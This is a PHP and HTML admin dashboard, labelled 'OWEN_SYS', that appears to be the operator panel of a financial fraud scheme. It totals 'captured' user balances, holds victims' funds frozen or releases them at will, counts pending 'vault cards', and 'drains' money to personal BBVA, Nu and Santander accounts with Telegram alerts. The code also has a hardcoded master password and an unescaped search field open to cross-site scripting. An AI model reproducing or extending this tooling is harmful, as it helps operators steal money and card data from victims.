<?php
// Ajuste de ruta: Subimos un nivel para entrar a includes
require '../includes/config.php';
session_start();

// --- CONFIGURACIÓN DE SEGURIDAD OWEN ---
$admin_pass = "Alcudia246"; 

if (!isset($_SESSION['admin_auth'])) {
    if (isset($_POST['master_key']) && $_POST['master_key'] === $admin_pass) {
        $_SESSION['admin_auth'] = true;
    } else {
        echo '<body style="background:#000; color:#ff0000; font-family:\'Courier New\', monospace; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden;">
                <form method="POST" style="border:2px solid #ff0000; padding:50px; background:#0a0a0a; text-align:center; box-shadow: 0 0 30px rgba(255,0,0,0.4); border-top: 6px solid #ff0000; width:400px;">
                    <i class="fas fa-user-secret" style="font-size:4rem; margin-bottom:25px; display:block; text-shadow: 0 0 15px #ff0000;"></i>
                    <h2 style="margin-bottom:30px; letter-spacing:8px; font-weight:900; text-transform:uppercase;">OWEN_CORE</h2>
                    <input type="password" name="master_key" placeholder="PASS_PROTOCOL" autofocus style="background:#000; border:1px solid #4c0519; color:#ff0000; padding:15px; outline:none; margin-bottom:25px; width:100%; text-align:center; font-family:inherit;"><br>
                    <button type="submit" style="background:#ff0000; color:#000; border:none; padding:15px; cursor:pointer; font-weight:900; width:100%; text-transform:uppercase; letter-spacing:3px;">DECRYPT_ACCESS</button>
                </form>
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
              </body>';
        exit;
    }
}

// --- PROCESADOR DE ACCIONES (Usuarios) ---
if (isset($_GET['op']) && isset($_GET['id'])) {
    $id = intval($_GET['id']);
    $op = $_GET['op'];
    
    if ($op == 'liberar') $conn->query("UPDATE usuarios SET permiso_retiro = 1 WHERE id = $id");
    if ($op == 'bloquear') $conn->query("UPDATE usuarios SET permiso_retiro = 0 WHERE id = $id");
    if ($op == 'ban') $conn->query("UPDATE usuarios SET verificado = 'baneado' WHERE id = $id");
    
    header("Location: admin_panel.php");
    exit;
}

// --- PROCESADOR DE RETIRO (Telegram Notify) ---
if (isset($_POST['monto_retiro'])) {
    $monto = $_POST['monto_retiro'];
    $cuenta = $_POST['mi_cuenta'];
    $fecha = date("d/m/Y H:i:s");

    $msg = "🔴 **OWEN_SYSTEMS: EXTRACCIÓN**\n";
    $msg .= "----------------------------\n";
    $msg .= "🏛 Nodo Destino: $cuenta\n";
    $msg .= "💵 Cantidad: **$" . number_format($monto, 2) . " MXN**\n";
    $msg .= "📅 Registro: $fecha\n";
    $msg .= "🚨 Status: Dispersión OK";

    @file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($msg) . "&parse_mode=Markdown");
    $payout_success = true;
}

// --- MÉTRICAS ---
$total_money = $conn->query("SELECT SUM(saldo_congelado) as total FROM usuarios")->fetch_assoc()['total'] ?? 0;
$total_users = $conn->query("SELECT COUNT(*) as total FROM usuarios")->fetch_assoc()['total'];
$pending_cards = $conn->query("SELECT COUNT(*) as total FROM vault_cards WHERE status = 'pendiente'")->fetch_assoc()['total'];

// Buscador
$search = isset($_GET['q']) ? $conn->real_escape_string($_GET['q']) : '';
$where = $search ? "WHERE nombre LIKE '%$search%' OR telefono LIKE '%$search%'" : "";
$usuarios = $conn->query("SELECT * FROM usuarios $where ORDER BY id DESC");
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>OWEN | ROOT_PANEL</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --bg: #000000; --card: #0a0a0a; --accent: #ff0000; --dark-accent: #4c0519; --border: #1a1a1a; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; font-size: 0.85rem; }
        
        .sidebar { width: 260px; height: 100vh; position: fixed; background: var(--card); border-right: 2px solid var(--accent); padding: 30px; z-index: 100; }
        .main-content { margin-left: 260px; padding: 40px; }
        
        .card-node { background: var(--card); border: 1px solid var(--border); border-radius: 2px; padding: 20px; transition: 0.3s; position: relative; }
        .card-node:hover { border-color: var(--accent); box-shadow: 0 0 15px rgba(255,0,0,0.2); }
        
        .table { color: #fff; border-color: var(--border); vertical-align: middle; }
        .table-hover tbody tr:hover { background: rgba(255,0,0,0.05); }
        .text-accent { color: var(--accent); }
        .mono { font-family: 'Courier New', monospace; letter-spacing: 1px; }
        
        .btn-owen { background: transparent; border: 1px solid var(--accent); color: var(--accent); font-size: 0.7rem; font-weight: bold; text-transform: uppercase; border-radius: 0; }
        .btn-owen:hover { background: var(--accent); color: #000; }
        
        .search-input { background: #000; border: 1px solid var(--dark-accent); color: white; padding: 8px 15px; border-radius: 0; width: 300px; }
        .search-input:focus { border-color: var(--accent); outline: none; }

        .badge-status { border-radius: 0; font-size: 0.6rem; padding: 4px 8px; letter-spacing: 1px; }
        .nav-link { color: #666; transition: 0.3s; padding: 10px 0; display: block; text-decoration: none; font-weight: bold; }
        .nav-link:hover, .nav-link.active { color: var(--accent); text-shadow: 0 0 10px var(--accent); }
    </style>
</head>
<body>

<div class="sidebar d-flex flex-column">
    <div class="text-center mb-5">
        <i class="fas fa-mask fa-3x text-accent mb-3"></i>
        <h3 class="text-white fw-bold mono">OWEN<span class="text-accent">_SYS</span></h3>
        <small style="font-size: 9px; color: #444;">V.1.0.4 CONTROL_CENTER</small>
    </div>
    
    <nav class="d-flex flex-column gap-2">
        <a href="admin_panel.php" class="nav-link active"><i class="fas fa-terminal me-2"></i> DASHBOARD</a>
        <a href="admin_vault.php" class="nav-link"><i class="fas fa-key me-2"></i> VAULT_CARDS 
            <?php if($pending_cards > 0): ?>
                <span class="badge bg-danger rounded-0 ms-1"><?php echo $pending_cards; ?></span>
            <?php endif; ?>
        </a>
        <hr style="border-color: var(--dark-accent);">
        <a href="logout.php" class="nav-link text-danger mt-4 small"><i class="fas fa-power-off me-2"></i> KILL_SESSION</a>
    </nav>

    <div class="mt-auto">
        <div class="card-node py-2 px-3 border-0 bg-danger bg-opacity-10 text-center">
            <span class="text-accent small fw-bold"><i class="fas fa-circle fa-xs me-1 fa-fade"></i> SYSTEM_LIVE</span>
        </div>
    </div>
</div>

<div class="main-content">
    
    <div class="row g-4 mb-5">
        <div class="col-md-8">
            <div class="card-node h-100" style="border-left: 5px solid var(--accent);">
                <div class="row align-items-center">
                    <div class="col-7">
                        <small class="text-uppercase opacity-50 mono">Total_Assets_Captured</small>
                        <h1 class="text-white fw-bold mono mb-0 mt-2">$<?php echo number_format($total_money, 2); ?> <small style="font-size: 0.9rem">MXN</small></h1>
                    </div>
                    <div class="col-5 text-end">
                        <button class="btn btn-danger fw-bold rounded-0 px-4" data-bs-toggle="modal" data-bs-target="#modalRetiro">
                            <i class="fas fa-download me-2"></i> EXTRACT_FUNDS
                        </button>
                    </div>
                </div>
            </div>
        </div>
        <div class="col-md-4">
            <div class="card-node h-100 text-center">
                <small class="text-uppercase opacity-50 mono">Active_Nodes</small>
                <h2 class="text-white mono mb-0 mt-2"><?php echo $total_users; ?></h2>
            </div>
        </div>
    </div>

    <div class="d-flex justify-content-between align-items-center mb-4">
        <h4 class="text-white m-0 mono"><i class="fas fa-network-wired text-accent me-3"></i>NODE_DATABASE</h4>
        <form method="GET" class="d-flex">
            <input type="text" name="q" class="search-input" placeholder="SCAN_ID_OR_NAME..." value="<?php echo $search; ?>">
            <button type="submit" class="btn btn-danger rounded-0 ms-2 px-3"><i class="fas fa-search"></i></button>
        </form>
    </div>

    <div class="card-node p-0 overflow-hidden" style="border-color: var(--dark-accent);">
        <table class="table table-hover mb-0">
            <thead style="background: var(--dark-accent); color: white;">
                <tr>
                    <th class="ps-4 py-3">ID</th>
                    <th>IDENTITY_TAG</th>
                    <th>BALANCE</th>
                    <th>SEC_LEVEL</th>
                    <th>ACCESS</th>
                    <th class="text-center">TERMINAL</th>
                </tr>
            </thead>
            <tbody style="background: #000;">
                <?php while($u = $usuarios->fetch_assoc()): ?>
                <tr style="border-bottom: 1px solid #111;">
                    <td class="ps-4 mono text-accent">#<?php echo $u['id']; ?></td>
                    <td>
                        <div class="text-white fw-bold text-uppercase"><?php echo $u['nombre']; ?></div>
                        <small style="color: #444;"><?php echo $u['telefono']; ?></small>
                    </td>
                    <td class="text-accent fw-bold mono">$<?php echo number_format($u['saldo_congelado'], 2); ?></td>
                    <td>
                        <?php if($u['verificado'] == 'si'): ?>
                            <span class="badge-status bg-white text-dark fw-bold">ROOT_VERIFIED</span>
                        <?php else: ?>
                            <span class="badge-status border border-secondary text-secondary">GUEST</span>
                        <?php endif; ?>
                    </td>
                    <td>
                        <?php if($u['permiso_retiro'] == 1): ?>
                            <span class="text-white small fw-bold"><i class="fas fa-unlock me-1"></i> OPEN</span>
                        <?php else: ?>
                            <span class="text-danger small fw-bold"><i class="fas fa-lock me-1"></i> ENCRYPTED</span>
                        <?php endif; ?>
                    </td>
                    <td class="text-center">
                        <div class="btn-group">
                            <?php if($u['permiso_retiro'] == 0): ?>
                                <a href="?op=liberar&id=<?php echo $u['id']; ?>" class="btn btn-owen py-1">BYPASS</a>
                            <?php else: ?>
                                <a href="?op=bloquear&id=<?php echo $u['id']; ?>" class="btn btn-outline-light py-1 rounded-0" style="font-size: 0.6rem;">FREEZE</a>
                            <?php endif; ?>
                            <a href="?op=ban&id=<?php echo $u['id']; ?>" class="btn btn-danger py-1 ms-1 rounded-0" style="font-size: 0.6rem;" onclick="return confirm('¿DESTRUIR NODO?')">KILL</a>
                        </div>
                    </td>
                </tr>
                <?php endwhile; ?>
            </tbody>
        </table>
    </div>
</div>

<div class="modal fade" id="modalRetiro" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content bg-black border-danger" style="border: 2px solid var(--accent); border-radius: 0;">
      <div class="modal-body p-5 text-center">
        <i class="fas fa-skull-crossbones fa-3x text-accent mb-4"></i>
        <h5 class="mono mb-4 text-accent">EXTRACTION_PROTOCOL_INIT</h5>
        <form method="POST">
            <select name="mi_cuenta" class="form-select bg-black text-white border-secondary mb-3 mono rounded-0 shadow-none">
                <option value="BBVA Principal">🏦 BBVA_NODE_01</option>
                <option value="Nu Mexico">💳 NU_NODE_02</option>
                <option value="Santander Personal">🏦 SANT_NODE_03</option>
            </select>
            <input type="number" name="monto_retiro" class="form-control bg-black text-white border-secondary mb-4 mono rounded-0 shadow-none" placeholder="AMOUNT_TO_DRAIN" step="0.01" required>
            <button type="submit" class="btn btn-danger w-100 fw-bold rounded-0 py-3 letter-spacing-2">CONFIRM_DISPERSION</button>
        </form>
      </div>
    </div>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
